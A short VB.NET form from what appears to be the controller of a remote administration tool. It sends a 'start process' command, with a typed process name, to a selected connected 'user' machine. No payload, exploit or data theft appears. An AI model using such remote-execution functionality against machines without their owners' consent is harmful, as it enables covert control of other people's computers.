Public Class ProcessmanagerStartProcess

    Private Sub ButtonStartProcess_Click(sender As Object, e As EventArgs) Handles ButtonStartProcess.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Starting Process: " & TextBoxProcessname.Text & "...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxProcessname.Text)
            Main.WriteCommand(Main.SelectedUserID & "|6")
            Using dialog As New Waiting()
                dialog.ShowDialog()
            End Using
            Me.Close()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
        End Try
    End Sub

    Private Sub ButtonAbort_Click(sender As Object, e As EventArgs) Handles ButtonAbort.Click
        Me.Close()
    End Sub
End Class